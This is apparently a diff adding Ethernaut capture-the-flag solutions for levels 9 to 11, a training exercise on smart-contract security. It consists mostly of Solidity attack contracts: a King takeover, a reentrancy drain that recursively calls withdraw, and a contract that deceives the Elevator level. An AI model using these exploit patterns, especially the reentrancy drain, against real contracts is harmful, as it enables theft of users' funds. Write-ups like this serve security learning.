@@ -167,3 +167,85 @@ interface IVault {
 
 Read the last 64 characters of the input data:
 https://mumbai.polygonscan.com/vmtrace?txhash=0xf99f1da3e77c8ef6ab7100f1ed34f0958f5fa8fc6053af2e420d2d9ba3b447a7&type=gethtrace2
+
+## Level 09
+
+https://ethernaut.openzeppelin.com/level/9
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IKing {
+    function prize() external view returns (uint);
+}
+
+contract KingHack {
+    constructor(address payable _target) payable {
+        uint value = IKing(_target).prize();
+        (bool sent,) = _target.call{value: value}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+```
+
+## Level 10
+
+https://ethernaut.openzeppelin.com/level/10
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint _amount) external;
+}
+
+contract Attack {
+    IReentrance public Reentrance;
+
+    constructor(address _address) public {
+        Reentrance = IReentrance(_address);
+    }
+
+    receive() external payable {
+        Reentrance.withdraw(1 gwei);
+    }
+
+    function attack() external payable {
+        Reentrance.donate{value: 1 gwei}(address(this));
+        Reentrance.withdraw(1 gwei);
+    }
+}
+```
+
+https://mumbai.polygonscan.com/tx/0xd07180c75c3f4b06a28a6357e6817530c6b206aa91a1c253e3ad65accc3bd183
+
+## Level 11
+
+https://ethernaut.openzeppelin.com/level/11
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint _floor) external;
+    function floor() external view returns (uint);
+    function top() external view returns (bool);
+}
+
+contract Building {
+    bool top = true;
+
+    function isLastFloor(uint) external returns (bool) {
+        top = !top;
+        return top;
+    }
+
+    function go(address _address, uint _floor) external {
+        IElevator(_address).goTo(_floor);
+    }
+}
+```
